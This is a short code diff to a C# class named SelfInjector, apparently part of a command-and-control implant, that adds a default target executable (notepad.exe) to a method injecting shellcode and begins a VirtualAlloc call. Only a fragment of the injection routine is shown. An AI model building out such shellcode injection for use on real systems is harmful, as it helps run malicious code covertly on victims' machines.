@@ -9,7 +9,7 @@ namespace Agent.Internal
 {
     public class SelfInjector : Injector
     {
-        public override bool Inject(byte[] shellcode, int pid = 0)
+        public override bool Inject(byte[] shellcode, int pid = 0, string exeToRun = @"C:\windows\system32\notepad.exe")
         {
             var baseAddr = Native.Kernel32.VirtualAlloc(
                 IntPtr.Zero,
